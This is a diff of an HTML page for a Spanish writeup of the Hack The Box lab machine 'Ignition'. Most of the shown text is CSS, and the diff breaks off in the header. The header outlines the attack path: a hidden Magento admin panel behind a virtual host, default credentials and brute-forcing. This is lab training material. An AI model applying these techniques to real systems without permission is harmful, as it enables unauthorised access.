@@ -1,147 +1,1088 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ignition — HTB Writeup | YRD</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB Ignition — Reporte de Pentesting</title>
   <style>
-    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
-    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
-    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
-    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
-    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
-    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
-    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
-    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
-    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
-    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
-    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
-    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
-    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
-    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
-    .hero h1 span{color:var(--primary);}
-    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
-    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
-    .meta-item{display:flex;flex-direction:column;gap:4px;}
-    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
-    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
-    .meta-value.green{color:var(--primary);}
-    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
-    @media(max-width:900px){.main{grid-template-columns:1fr;}}
-    .content{display:flex;flex-direction:column;gap:2rem;}
-    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
-    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
-    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
-    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
-    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
-    .section p:last-child{margin-bottom:0;}
-    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
-    .section li{margin-bottom:0.3rem;}
-    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
-    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
-    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
-    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
-    .comment{color:#6a9955;}
-    .cmd{color:var(--cyan);}
-    .output{color:var(--text-dim);}
-    .highlight{color:var(--primary);font-weight:600;}
-    .cred{color:var(--yellow);font-weight:600;}
-    .flag-val{color:#ff79c6;}
-    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
-    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
-    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
-    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
-    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
-    .timeline{display:flex;flex-direction:column;gap:0;}
-    .timeline-item{display:flex;gap:1.25rem;}
-    .timeline-left{display:flex;flex-direction:column;align-items:center;}
-    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
-    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
-    .timeline-item:last-child .timeline-line{display:none;}
-    .timeline-content{padding-bottom:1.5rem;}
-    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
-    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
-    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
-    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
-    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
-    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
-    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
-    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
-    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
-    .detail-row:last-child{border-bottom:none;}
-    .detail-key{font-size:0.8rem;color:var(--text-muted);}
-    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
-    .detail-val.green{color:var(--primary);}
-    .detail-val.cyan{color:var(--cyan);}
-    .skill-item{margin-bottom:1rem;}
-    .skill-item:last-child{margin-bottom:0;}
-    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
-    .skill-name{font-size:0.82rem;color:var(--text-dim);}
-    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
-    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
-    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
-    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
-    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
-    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
-    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
-    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
-    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
-    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
-    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
-    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
-    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
-    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
-    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
-    .data-table td{color:var(--text-dim);}
-    a{color:var(--primary);text-decoration:none;}
+    :root {
+      --accent: #4ade80;
+      --accent-dim: #16a34a;
+      --accent-glow: rgba(74,222,128,0.15);
+      --bg: #0a0e1a;
+      --bg2: #0f1629;
+      --bg3: #141d35;
+      --card: #111827;
+      --card2: #1a2540;
+      --border: #1e2d4a;
+      --text: #e2e8f0;
+      --text-muted: #64748b;
+      --text-dim: #94a3b8;
+      --red: #f87171;
+      --yellow: #fbbf24;
+      --blue: #60a5fa;
+      --purple: #a78bfa;
+      --orange: #fb923c;
+      --cyan: #22d3ee;
+      --green: #4ade80;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ─── HERO ─────────────────────────────────── */
+    .hero {
+      position: relative;
+      background: linear-gradient(135deg, #0a0e1a, #0d1a2b, #091a10);
+      padding: 72px 48px 60px;
+      overflow: hidden;
+      border-bottom: 1px solid var(--border);
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -120px; left: -120px;
+      width: 500px; height: 500px;
+      background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero::after {
+      content: '>';
+      position: absolute;
+      right: 48px; bottom: -20px;
+      font-size: 280px;
+      font-family: monospace;
+      font-weight: 900;
+      color: var(--accent);
+      opacity: 0.04;
+      line-height: 1;
+      pointer-events: none;
+      user-select: none;
+    }
+    .tags-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      border: 1px solid transparent;
+    }
+    .tag-platform { background: rgba(74,222,128,0.12); color: var(--green); border-color: rgba(74,222,128,0.3); }
+    .tag-easy     { background: rgba(74,222,128,0.12); color: var(--green); border-color: rgba(74,222,128,0.3); }
+    .tag-medium   { background: rgba(251,191,36,0.12); color: var(--yellow); border-color: rgba(251,191,36,0.3); }
+    .tag-hard     { background: rgba(248,113,113,0.12); color: var(--red); border-color: rgba(248,113,113,0.3); }
+    .tag-os       { background: rgba(167,139,250,0.12); color: var(--purple); border-color: rgba(167,139,250,0.3); }
+    .tag-pwned    { background: rgba(74,222,128,0.15); color: var(--green); border-color: rgba(74,222,128,0.4); }
+    .tag-time     { background: rgba(96,165,250,0.12); color: var(--blue); border-color: rgba(96,165,250,0.3); }
+
+    .hero h1 {
+      font-size: 3rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      color: #fff;
+      margin-bottom: 8px;
+      line-height: 1.1;
+    }
+    .hero h1 span { color: var(--accent); }
+    .hero-sub {
+      font-size: 1.05rem;
+      color: var(--text-dim);
+      margin-bottom: 32px;
+      max-width: 620px;
+    }
+    .hero-stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 32px;
+    }
+    .hero-stat { display: flex; flex-direction: column; }
+    .hero-stat-val {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--accent);
+      font-family: monospace;
+    }
+    .hero-stat-lbl {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-muted);
+    }
+
+    /* ─── QUICK STATS ───────────────────────────── */
+    .quick-stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      max-width: 1280px;
+      margin: 32px auto 0;
+      padding: 0 32px;
+    }
+    .qs-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .qs-num {
+      font-size: 2rem;
+      font-weight: 800;
+      color: var(--accent);
+      line-height: 1;
+    }
+    .qs-lbl {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    /* ─── MAIN GRID ─────────────────────────────── */
+    .container {
+      max-width: 1280px;
+      margin: 32px auto 64px;
+      padding: 0 32px;
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 32px;
+      align-items: start;
+    }
+
+    /* ─── SECTIONS ──────────────────────────────── */
+    .section {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 28px 32px;
+      margin-bottom: 24px;
+    }
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .section-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 30px;
+      height: 30px;
+      background: var(--accent);
+      color: #000;
+      font-size: 13px;
+      font-weight: 800;
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+    .section-title {
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: #fff;
+    }
+    .section-title-icon { font-size: 1.1rem; }
+
+    p { margin-bottom: 12px; color: var(--text-dim); }
+    p:last-child { margin-bottom: 0; }
+
+    /* ─── CALLOUTS ──────────────────────────────── */
+    .callout {
+      border-left: 3px solid;
+      border-radius: 0 8px 8px 0;
+      padding: 12px 16px;
+      margin: 16px 0;
+      font-size: 0.93rem;
+    }
+    .callout strong { display: block; margin-bottom: 4px; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em; }
+    .callout-info  { background: rgba(96,165,250,0.08);  border-color: var(--blue);   color: var(--text-dim); }
+    .callout-info strong  { color: var(--blue); }
+    .callout-warn  { background: rgba(251,191,36,0.08);  border-color: var(--yellow); color: var(--text-dim); }
+    .callout-warn strong  { color: var(--yellow); }
+    .callout-danger{ background: rgba(248,113,113,0.08); border-color: var(--red);    color: var(--text-dim); }
+    .callout-danger strong{ color: var(--red); }
+    .callout-tip   { background: rgba(74,222,128,0.08);  border-color: var(--accent); color: var(--text-dim); }
+    .callout-tip strong   { color: var(--accent); }
+
+    /* ─── CODE BLOCKS ───────────────────────────── */
+    .code-block {
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 16px 0;
+      border: 1px solid var(--border);
+    }
+    .code-label {
+      background: var(--bg3);
+      padding: 7px 14px;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .code-label .dot { width: 8px; height: 8px; border-radius: 50%; }
+    .dot-red { background: #f87171; }
+    .dot-yellow { background: #fbbf24; }
+    .dot-green { background: #4ade80; }
+    .code-body {
+      background: #050810;
+      padding: 16px 18px;
+      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+      font-size: 13px;
+      line-height: 1.75;
+      overflow-x: auto;
+      white-space: pre;
+    }
+    .cmd     { color: var(--green); }
+    .param   { color: var(--cyan); }
+    .ip      { color: var(--orange); }
+    .user    { color: var(--purple); }
+    .path    { color: var(--blue); }
+    .comment { color: var(--text-muted); font-style: italic; }
+    .success { color: var(--green); }
+    .highlight { color: var(--red); }
+    .flag-hl { color: var(--yellow); font-weight: 700; }
+    .out     { color: var(--text-dim); }
+
+    /* ─── TIMELINE ──────────────────────────────── */
+    .timeline { padding-left: 28px; position: relative; }
+    .timeline::before {
+      content: '';
+      position: absolute;
+      left: 5px; top: 8px; bottom: 8px;
+      width: 2px;
+      background: var(--border);
+    }
+    .tl-item {
+      position: relative;
+      margin-bottom: 24px;
+    }
+    .tl-item:last-child { margin-bottom: 0; }
+    .tl-dot {
+      position: absolute;
+      left: -27px;
+      top: 5px;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      border: 2px solid;
+      background: var(--bg);
+    }
+    .tl-dot-green  { border-color: var(--green); }
+    .tl-dot-blue   { border-color: var(--blue); }
+    .tl-dot-yellow { border-color: var(--yellow); }
+    .tl-dot-red    { border-color: var(--red); }
+    .tl-dot-cyan   { border-color: var(--cyan); }
+    .tl-dot-purple { border-color: var(--purple); }
+    .tl-dot-orange { border-color: var(--orange); }
+    .tl-time {
+      font-size: 11px;
+      color: var(--text-muted);
+      font-family: monospace;
+      margin-bottom: 2px;
+    }
+    .tl-title {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+      font-size: 0.95rem;
+    }
+    .tl-desc { color: var(--text-dim); font-size: 0.9rem; }
+
+    /* ─── VULN CARDS ────────────────────────────── */
+    .vuln-card {
+      border-left: 4px solid var(--red);
+      border-radius: 0 10px 10px 0;
+      background: var(--card2);
+      padding: 16px 20px;
+      margin-bottom: 16px;
+    }
+    .vuln-card:last-child { margin-bottom: 0; }
+    .vuln-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      gap: 12px;
+    }
+    .vuln-name { font-weight: 700; color: #fff; font-size: 0.95rem; }
+    .vuln-cwe  { font-size: 11px; font-family: monospace; color: var(--text-muted); }
+    .vuln-desc { color: var(--text-dim); font-size: 0.9rem; margin: 0; }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      padding: 3px 9px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .badge-red    { background: rgba(248,113,113,0.15); color: var(--red); }
+    .badge-yellow { background: rgba(251,191,36,0.15);  color: var(--yellow); }
+    .badge-blue   { background: rgba(96,165,250,0.15);  color: var(--blue); }
+    .badge-green  { background: rgba(74,222,128,0.15);  color: var(--green); }
+    .badge-orange { background: rgba(251,146,60,0.15);  color: var(--orange); }
+    .badge-purple { background: rgba(167,139,250,0.15); color: var(--purple); }
+    .badge-cyan   { background: rgba(34,211,238,0.15);  color: var(--cyan); }
+
+    /* ─── FLAG BOX ──────────────────────────────── */
+    .flag-box {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      background: linear-gradient(135deg, rgba(74,222,128,0.08), rgba(74,222,128,0.03));
+      border: 1px solid rgba(74,222,128,0.3);
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin: 20px 0;
+    }
+    .flag-icon {
+      font-size: 32px;
+      flex-shrink: 0;
+      line-height: 1;
+    }
+    .flag-content { flex: 1; }
+    .flag-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--accent-dim);
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .flag-value {
+      font-family: monospace;
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: var(--yellow);
+      word-break: break-all;
+    }
+
+    /* ─── REC GRID ──────────────────────────────── */
+    .rec-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+    }
+    .rec-card {
+      background: var(--card2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+    }
+    .rec-priority {
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 8px;
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+    }
+    .prio-critical { background: rgba(248,113,113,0.2); color: var(--red); }
+    .prio-high     { background: rgba(251,146,60,0.2);  color: var(--orange); }
+    .prio-medium   { background: rgba(251,191,36,0.2);  color: var(--yellow); }
+    .prio-low      { background: rgba(74,222,128,0.2);  color: var(--green); }
+    .rec-title { font-weight: 700; color: #fff; font-size: 0.9rem; margin-bottom: 6px; }
+    .rec-desc  { color: var(--text-dim); font-size: 0.85rem; margin: 0; }
+
+    /* ─── GLOSARIO ──────────────────────────────── */
+    .glosario-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+    }
+    .glosario-item {
+      background: var(--card2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 16px;
+    }
+    .glosario-term {
+      font-weight: 700;
+      color: var(--cyan);
+      font-family: monospace;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+    }
+    .glosario-def { color: var(--text-dim); font-size: 0.85rem; margin: 0; }
+
+    /* ─── ARTIFACT CARDS ────────────────────────── */
+    .artifact-list { display: flex; flex-direction: column; gap: 10px; }
+    .artifact-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: var(--card2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px 16px;
+    }
+    .artifact-icon { font-size: 22px; flex-shrink: 0; }
+    .artifact-name {
+      font-family: monospace;
+      color: var(--green);
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+    .artifact-desc { color: var(--text-muted); font-size: 0.82rem; margin: 0; }
+
+    /* ─── TABLE ─────────────────────────────────── */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      margin: 12px 0;
+    }
+    th {
+      background: var(--bg3);
+      color: var(--accent);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+    td {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-dim);
+      vertical-align: top;
+    }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(255,255,255,0.015); }
+    td code, th code {
+      font-family: monospace;
+      color: var(--cyan);
+      font-size: 0.88rem;
+    }
+
+    /* ─── SIDEBAR ───────────────────────────────── */
+    .sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
+    .sidebar-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px;
+    }
+    .sidebar-title {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--accent);
+      margin-bottom: 14px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 7px 0;
+      border-bottom: 1px solid var(--border);
+      gap: 8px;
+    }
+    .info-row:last-child { border-bottom: none; }
+    .info-key   { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; flex-shrink: 0; }
+    .info-val   { font-size: 12px; color: var(--text); text-align: right; font-family: monospace; }
+    .tool-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 12px;
+      color: var(--text-dim);
+      margin: 3px;
+      font-family: monospace;
+    }
+    .toc-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 0;
+      color: var(--text-dim);
+      font-size: 12.5px;
+      border-bottom: 1px solid var(--border);
+      transition: color 0.15s;
+    }
+    .toc-link:last-child { border-bottom: none; }
+    .toc-link:hover { color: var(--accent); text-decoration: none; }
+    .toc-num {
+      font-size: 10px;
+      font-family: monospace;
+      color: var(--accent);
+      width: 18px;
+      flex-shrink: 0;
+    }
+    .mitre-item {
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .mitre-item:last-child { border-bottom: none; }
+    .mitre-id   { font-family: monospace; font-size: 12px; color: var(--green); font-weight: 700; }
+    .mitre-name { font-size: 11.5px; color: var(--text-dim); margin-top: 2px; }
+
+    /* ─── FLAG SIDEBAR ──────────────────────────── */
+    .flag-sidebar {
+      background: linear-gradient(135deg, rgba(74,222,128,0.1), rgba(74,222,128,0.04));
+      border: 1px solid rgba(74,222,128,0.35);
+      border-radius: 10px;
+      padding: 14px;
+      text-align: center;
+    }
+    .flag-sidebar-lbl { font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--accent-dim); margin-bottom: 6px; }
+    .flag-sidebar-val { font-family: monospace; font-size: 11.5px; color: var(--yellow); word-break: break-all; font-weight: 700; }
+
+    /* ─── SPECIAL SECTIONS ──────────────────────── */
+    .concept-box {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      margin: 16px 0;
+    }
+    .concept-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: var(--cyan);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .concept-body { color: var(--text-dim); font-size: 0.88rem; line-height: 1.7; }
+    .concept-body code {
+      font-family: monospace;
+      color: var(--accent);
+      background: rgba(74,222,128,0.1);
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    .fp-box {
+      background: rgba(248,113,113,0.05);
+      border: 1px solid rgba(248,113,113,0.2);
+      border-radius: 10px;
+      padding: 20px;
+      margin: 16px 0;
+    }
+    .fp-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: var(--red);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .compare-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin: 12px 0;
+    }
+    .compare-card {
+      border-radius: 8px;
+      padding: 14px;
+    }
+    .compare-bad  { background: rgba(248,113,113,0.07); border: 1px solid rgba(248,113,113,0.2); }
+    .compare-good { background: rgba(74,222,128,0.07);  border: 1px solid rgba(74,222,128,0.2); }
+    .compare-label {
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 8px;
+    }
+    .compare-bad  .compare-label { color: var(--red); }
+    .compare-good .compare-label { color: var(--green); }
+    .compare-text { font-size: 0.85rem; color: var(--text-dim); }
+
+    /* ─── FOOTER ────────────────────────────────── */
+    footer {
+      background: var(--bg2);
+      border-top: 1px solid var(--border);
+      padding: 28px 48px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .footer-left { color: var(--text-muted); font-size: 13px; }
+    .footer-left strong { color: var(--accent); }
+    .footer-right { color: var(--text-muted); font-size: 12px; font-family: monospace; }
+
+    /* ─── RESPONSIVE ────────────────────────────── */
+    @media (max-width: 900px) {
+      .container { grid-template-columns: 1fr; }
+      .sidebar { position: static; }
+      .quick-stats { grid-template-columns: repeat(2, 1fr); }
+      .rec-grid, .glosario-grid, .compare-grid { grid-template-columns: 1fr; }
+      .hero { padding: 48px 24px 40px; }
+      .hero h1 { font-size: 2rem; }
+    }
   </style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
 
-<div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Ignition</div>
-  <div class="tags">
-    <span class="tag tag-htb">HTB</span>
-    <span class="tag tag-os">LINUX</span>
-    <span class="tag tag-veryeasy">VERY EASY</span>
-    <span class="tag tag-htb">STARTING POINT</span>
+<!-- ═══════════════════════════════════════════════════════
+     HERO
+═══════════════════════════════════════════════════════ -->
+<section class="hero">
+  <div class="tags-row">
+    <span class="tag tag-platform">HackTheBox</span>
+    <span class="tag tag-platform">Starting Point</span>
+    <span class="tag tag-easy">Very Easy</span>
+    <span class="tag tag-os">Linux</span>
+    <span class="tag tag-pwned">&#10003; Pwned</span>
+    <span class="tag tag-time">&#128336; ~8 min</span>
   </div>
-  <h1>Ignition <span>Machine</span></h1>
-  <p class="hero-desc">Servidor Nginx con vhosts y panel Magento oculto. Enumeración de virtual hosts, directory fuzzing con Gobuster, y acceso al panel de administración con credenciales por defecto.</p>
-  <div class="meta-row">
-    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
-    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
-    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / gobuster</span></div>
-    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
+  <h1>Ignition <span>//</span> HTB</h1>
+  <p class="hero-sub">
+    Máquina Linux Very Easy de HTB Starting Point. Superficie de ataque: panel de administración
+    Magento con credenciales por defecto, accesible solo mediante Virtual Host.
+    Combina reconocimiento web, resolución de vhost sin <code style="color:var(--accent);background:rgba(74,222,128,0.1);padding:1px 5px;border-radius:3px;font-size:0.9em">/etc/hosts</code>
+    y brute-force con detección correcta de respuestas HTTP.
+  </p>
+  <div class="hero-stats">
+    <div class="hero-stat">
+      <span class="hero-stat-val">10.129.1.27</span>
+      <span class="hero-stat-lbl">Target IP</span>
+    </div>
+    <div class="hero-stat">
+      <span class="hero-stat-val">2026-03-17</span>
+      <span class="hero-stat-lbl">Fecha</span>
+    </div>
+    <div class="hero-stat">
+      <span class="hero-stat-val">nginx 1.14.2</span>
+      <span class="hero-stat-lbl">Web Server</span>
+    </div>
+    <div class="hero-stat">
+      <span class="hero-stat-val">Magento CMS</span>
+      <span class="hero-stat-lbl">Tecnología</span>
+    </div>
+    <div class="hero-stat">
